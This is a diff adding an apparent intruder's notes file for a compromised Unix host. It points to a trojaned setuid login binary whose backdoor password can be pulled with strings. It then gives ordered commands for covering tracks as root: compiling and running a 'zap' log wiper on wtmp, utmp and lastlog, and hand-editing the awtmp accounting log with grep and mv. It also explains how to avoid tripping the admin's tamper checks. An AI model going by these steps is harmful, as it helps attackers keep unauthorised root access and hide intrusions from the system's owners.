@@ -1,0 +1,19 @@
+notes -- clean this dir before you log off (you never do)
+
+* this box gets WATCHED.  the admin reviews `last` and the connect-time billing
+  (/var/account/awtmp) on a timer.  if your session still shows, you're traced.
+
+* root's still easy: the login is trojaned and setuid -- check it:
+      ls -l /usr/bin/login
+  run it and give the word.  forgot the word?  it's baked into the binary:
+      strings /usr/bin/login
+
+* covering up (do this as root, in THIS order, before you drop):
+      cc -o zap zap.c
+      ./zap <your-login-name>          # wipes wtmp + utmp + lastlog (zeroes, in place)
+  then the billing log BY HAND (zap doesn't touch it):
+      grep -v <your-login-name> /var/account/awtmp > /tmp/a
+      mv /tmp/a /var/account/awtmp
+
+* zero the records -- do NOT rm or truncate the logs.  an empty wtmp is its own
+  alarm; the admin's sweep treats a blanked log as tampering and calls it in.
